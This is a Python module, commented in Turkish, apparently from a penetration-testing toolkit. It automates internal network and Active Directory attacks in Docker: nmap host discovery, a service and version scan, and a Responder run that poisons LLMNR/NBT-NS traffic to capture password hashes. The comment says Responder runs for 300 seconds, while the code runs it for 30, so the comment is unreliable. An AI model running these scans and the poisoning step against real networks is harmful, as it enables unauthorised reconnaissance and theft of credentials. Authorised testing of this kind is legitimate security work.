import os
from .docker_helper import run_command_in_docker

def run_internal_tests(ip_range, output_dir, image_name):
    """
    İç ağ keşfi ve temel Active Directory testlerini çalıştırır.
    Bu modülün etkili olabilmesi için script'in hedef ağ içinden çalıştırılması gerekir.

    Args:
        ip_range (str): Taranacak IP aralığı (örn: "192.168.1.0/24").
        output_dir (str): Çıktıların kaydedileceği dizin.
        image_name (str): Kullanılacak Docker imajı.
    """
    print("\n[+] İç Ağ ve Active Directory Testleri modülü başlatılıyor...")

    # İç ağda çalıştırılacak komutlar.
    # Bu komutların çoğu, hedef ağa doğrudan erişim gerektirir.
    commands = {
        # 1. Adım: Ağdaki canlı cihazları hızlıca bul (Ping Scan)
        "nmap_host_discovery_ciktisi.txt": f"nmap -sn {ip_range}",
        
        # 2. Adım: Ağdaki tüm cihazlarda yaygın portları ve servis versiyonlarını tara
        "nmap_service_scan_ciktisi.txt": f"nmap -sV -T4 --open {ip_range}",

        # 3. Adım: Responder'ı 5 dakika (300 saniye) boyunca çalıştırarak
        # LLMNR ve NBT-NS zehirlemesi ile hash yakalamayı dene.
        # Otomasyonda takılı kalmaması için 'timeout' komutu kritik öneme sahiptir.
        "responder_ciktisi.txt": f"timeout 30 responder -I eth0 -v"
    }

    # Her bir komutu sırayla çalıştırıyoruz.
    for output_filename, command in commands.items():
        output_file_path = os.path.join(output_dir, output_filename)
        run_command_in_docker(command, output_file_path, image_name)

    print("\n[+] İç Ağ ve Active Directory Testleri modülü tamamlandı.")